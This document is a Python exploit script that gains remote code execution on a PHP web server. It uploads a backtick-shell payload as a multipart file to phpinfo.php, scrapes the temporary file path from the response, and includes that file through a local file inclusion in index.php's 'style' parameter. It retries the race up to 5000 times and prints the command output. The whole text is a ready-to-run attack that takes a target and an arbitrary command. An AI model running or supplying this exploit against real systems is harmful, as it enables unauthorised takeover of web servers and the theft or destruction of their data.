import socket
import requests
import sys

if len(sys.argv)<4:
    print("Usage python3 exploit.py host/ip port command")
    exit()


host = sys.argv[1]
port = int(sys.argv[2])
command="<?=`"+sys.argv[3]+"`?>"

content_legnth=157+len(command)

def upload():
    # Set up the socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # Send the HTTP request
    request= b"POST /phpinfo.php HTTP/1.1\r\nHost: "+host.encode()+b"\r\nContent-Length: "+str(content_legnth).encode()+b"\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary6e0XNE1AdnjtDVR9\r\n\r\n------WebKitFormBoundary6e0XNE1AdnjtDVR9\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n"+command.encode()+b"\r\n\r\n------WebKitFormBoundary6e0XNE1AdnjtDVR9--"
    s.send(request)

    # Receive the response
    response = s.recv(10000000)
    s.close()

    # Close the socket connection
    return response



err="yes"
trail=0
while not err=="no" and trail < 5000:
    try:
        print("trial number : ",trail+1)
        print("*-"*30)
        print("Uploading")
        upload_response=upload()
        tmp_location=upload_response.decode().split("[tmp_name] =&gt; ")[1][0:14]
        print("*-"*30)
        print("Got the tmp file")
        print("*-"*30)
        r=requests.get("http://"+host+":"+str(port)+"/index.php?style="+tmp_location)
        if not "An Err" in r.text:
            output=r.text.split("<style>")[1].split("</style>")[0]
            print("Got it !, Yor RCE output is :",output)
            err="no"
        else:
            err="yes"
    except:
        err="yes"
    trail+=1
